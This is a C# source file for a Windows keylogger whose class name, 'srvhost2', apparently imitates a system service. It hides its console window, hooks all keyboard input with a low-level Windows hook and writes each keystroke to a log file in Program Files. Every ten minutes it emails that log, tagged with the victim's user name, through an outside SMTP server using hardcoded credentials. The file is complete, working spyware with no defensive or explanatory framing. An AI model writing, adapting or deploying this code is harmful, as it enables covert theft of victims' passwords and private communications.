using System;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using System.Drawing;
using System.Threading;
using System.Net.Mail;
using System.Net;

class srvhost2
{
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private static LowLevelKeyboardProc _proc = HookCallback;
    private static IntPtr _hookID = IntPtr.Zero;

    public static void Main()
    {
        var timer = new System.Threading.Timer(e => SendEmail(), null, TimeSpan.Zero, TimeSpan.FromMinutes(10));

        var handle = GetConsoleWindow();

        // Hide
        ShowWindow(handle, SW_HIDE);

        _hookID = SetHook(_proc);

        Application.Run();
        UnhookWindowsHookEx(_hookID);

    }

    private static IntPtr SetHook(LowLevelKeyboardProc proc)
    {
        using (Process curProcess = Process.GetCurrentProcess())
        using (ProcessModule curModule = curProcess.MainModule)
        {
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                GetModuleHandle(curModule.ModuleName), 0);
        }
    }

    public static void SendEmail()
    {
        if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86) + @"\log.txt"))
        {
            MailMessage mail = new MailMessage();
            SmtpClient SmtpServer = new SmtpClient("smtp.mail.com");

            mail.From = new MailAddress("[EMAIL]");
            mail.To.Add("[EMAIL]");
            mail.Subject = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
            string text = System.IO.File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86) + @"\log.txt");
            mail.Body = text;
            SmtpServer.Port = 587;
            SmtpServer.Credentials = new System.Net.NetworkCredential("[EMAIL]", "[PASSWORD]");
            SmtpServer.EnableSsl = true;

            SmtpServer.Send(mail);
        }
    }

    private delegate IntPtr LowLevelKeyboardProc(
        int nCode, IntPtr wParam, IntPtr lParam);

    private static IntPtr HookCallback(
        int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
        {
            int vkCode = Marshal.ReadInt32(lParam);
            Console.WriteLine((Keys)vkCode);
            StreamWriter sw = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86) + @"\log.txt", true);
            sw.Write((Keys)vkCode);
            sw.Close();
        }
        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook,
        LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
        IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    const int SW_HIDE = 0;

}
